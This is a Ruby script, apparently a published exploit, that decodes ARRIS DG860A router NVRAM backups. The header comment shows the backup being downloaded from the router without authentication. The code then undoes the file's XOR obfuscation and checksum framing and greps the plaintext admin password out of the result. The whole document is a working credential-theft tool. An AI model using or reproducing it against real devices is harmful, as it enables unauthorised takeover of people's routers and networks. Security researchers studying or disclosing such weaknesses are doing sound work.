#!/usr/bin/env ruby
# ARRIS DG860A NVRAM Backup 'Compressor/Decompressor', it really does xor?
# Gleaned from sc_mix executable in firmware dump.
#
# Backup file is world readable without authentication and contains password
# information in plain text.
#
# box:arris-dev cosmo$ wget http://192.168.0.1/router.data
# --2013-10-17 18:21:28--  http://192.168.0.1/router.data
# Connecting to 192.168.0.1:80... connected.
# HTTP request sent, awaiting response... 200 OK
# Length: 3518 (3.4K) [application/octet-stream]
# Saving to: ‘router.data’
#
# 100%[=============================================================================================================>] 3,518       --.-K/s   in 0s
#
# 2013-10-17 18:21:28 (108 MB/s) - ‘router.data’ saved [3518/3518]
#
# box:arris-dev cosmo$ tar vxf router.data
# x backup/
# x backup/sc_nvram.usr.sc
# x backup/sc_nvram.sc
# box:arris-dev cosmo$ sudo ./sc_mix.rb -u -s backup/sc_nvram.usr.sc -d sc_nvram_dump
# Password:
# box:arris-dev cosmo$ cat sc_nvram_dump | tr "\000\000" "\000" | tr "\000" "\n" | grep sysAdminPassword
# sysAdminPassword[0]=test123
# box:arris-dev cosmo$
#
#
#

require 'optparse'
require 'highline/import'
require 'zlib'

def Compress(infile, outfile)
  instream = nil
  outstream = nil
  size = 0
  calculatedcrc = 0
  data=''
  size = File.size?(infile)
  instream = File.open(infile,'r')
  data = instream.read()
  data = data.bytes.map { |a| a ^ 0xFFFFFFAA }.pack('c*')
  instream.close() if !instream.nil?
  outstream = File.open(outfile,'w')
  outstream.write("\x00NOF")
  outstream.write([size].pack('L>'))
  calculatedcrc = Zlib::crc32(data)
  outstream.write([calculatedcrc].pack('L>'))
  outstream.write([size].pack('L>'))
  outstream.write("\x00\x00\x00\x00" * 6)
  outstream.write(data)
  outstream.close() if !outstream.nil?
end

def Decompress(infile, outfile)
  instream = nil
  outstream = nil
  size = 0
  embeddedcrc = 0
  calculatedcrc = 0
  data=''
  if !(File::size?(infile) >= 0x28)
    puts "[ERROR]: Source file size is insufficient(Smaller then 0x28 bytes)"
    exit
  end
  instream = File::open(infile,'r')
  if instream.read(4) != "\x00NOF"
    instream.close() if !instream.nil?
    puts "[ERROR]: Source file contains invalid magic(\\x00NOF)"
    exit
  end
  size = instream.read(4).unpack("L>")[0]
  embeddedcrc = instream.read(4).unpack("L>")[0]
  if !(File.size?(infile) >= (0x28+size))
    puts "[ERROR]: Source file size if insufficient(Smaller then 0x" + (0x28+minsize).to_s(16) + ")"
    instream.close() if !instream.nil?
  end
  instream.seek(0x28,IO::SEEK_SET)
  data = instream.read(size)
  calculatedcrc = Zlib::crc32(data)
  if embeddedcrc != calculatedcrc
    puts "[ERROR]: Checksum mismatch"
    instream.close() if !instream.nil?
    exit
  end
  outstream = File::open(outfile,'w')
  outstream.write(data.bytes.map { |a| a ^ 0xFFFFFFAA }.pack('c*'))
  instream.close() if !instream.nil?
  outstream.close() if !outstream.nil?
end

#begin
if __FILE__ == $0
  options = {}
  opt_parser = OptionParser.new do |opts|
      opts.banner = "Usage: sc_mix.rb -s <Src_PATH> -d <Dest_PATH>"
      opts.separator "Usage:"
      opts.on('-s', '--source Src_PATH', 'Source File') { |v| options[:source_file] = v }
      opts.on('-d', '--destination Dest_PATH', 'Destination File') { |v| options[:destination_file] = v }
      opts.on('-u', 'Uncompress') { options[:uncompress] = true }
     opts.on_tail("-h", "Show this message") do
          puts opts
          exit
      end
  end
  opt_parser.parse!
  if options[:source_file].nil? or options[:destination_file].nil?
    puts opt_parser
    exit
  end
  if !File::exists?(options[:source_file]) or !File::readable?(options[:source_file])
    puts "[ERROR]: File does not exist or there are insufficient privileges(sudo?)"
    exit
  end
  if File::exists?(options[:destination_file])
    if !agree("[ERROR]: File exists attempt to overwrite[yes/no]? ")
      exit
    end
    if !File::writable?(options[:destination_file])
      puts "[ERROR]: File is not writeable is there insufficient privileges(sudo?)"
      exit
    end
  end
  if !options[:uncompress]
    puts "[WARNING]: Compression is currently beta"
    Compress(options[:source_file], options[:destination_file])
  else
    Decompress(options[:source_file], options[:destination_file])
  end
end